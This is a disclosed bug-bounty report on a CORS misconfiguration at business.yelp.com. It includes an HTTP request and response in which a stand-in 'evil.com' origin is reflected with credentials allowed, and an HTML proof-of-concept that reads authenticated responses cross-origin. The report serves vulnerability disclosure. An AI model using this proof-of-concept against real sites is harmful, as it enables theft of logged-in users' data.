# CORS Misconfiguration on Yelp

## Report Details
- **Report ID**: 1707616
- **URL**: https://hackerone.com/reports/1707616
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-09-21T16:13:35.691Z
- **Disclosed**: 2022-09-28T03:43:10.963Z

## Reporter
- **Username**: qualw1n
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: yelp

## Vulnerability Information
## Entry
An cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page

## Description:
CORS misconfiguration is found on business.yelp.com as Access-Control-Allow-Credentials: true.

## Steps to reproduce:

Visit business site.

## Request
GET /wp-json HTTP/2
Host: business.yelp.com
Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Origin: evil.com

## Response
Allow: GET
Access-Control-Allow-Origin: http://evil.com
Access-Control-Allow-Methods: OPTIONS, GET, POST, PUT, PATCH, DELETE
Access-Control-Allow-Credentials: true

## POC
<!DOCTYPE html>
<html>
    <head>
        <script>
            function cors() {
                var xhttp=new XMLHttpRequest();
                    xhttp.onreadystatechange= function() {
                        if (this.readyState == 4 && this.status ==200){
                            document.getElementById("emo").innerHTML=alert(this.responseText
                                );
                        }
                };
                xhttp.open('GET',"https://business.yelp.com/wp-json/",true);
                xhttp.withCredentials=true;
                xhttp.send();
            }
        </script>
    </head>
    <body>
        <center>
        <h2>[!]CORS P0C - Qualw1n</h2>
        <div id="demo">
            <button type="button" onclick="cors()">Exploit</button> 
        </div>
        </center>
    </body>
</html>

## Photo
{F1945188}

## Impact

Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.
Also If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information.

## Attachments
- image.png
- 2022-09-21_19-12-05.mkv
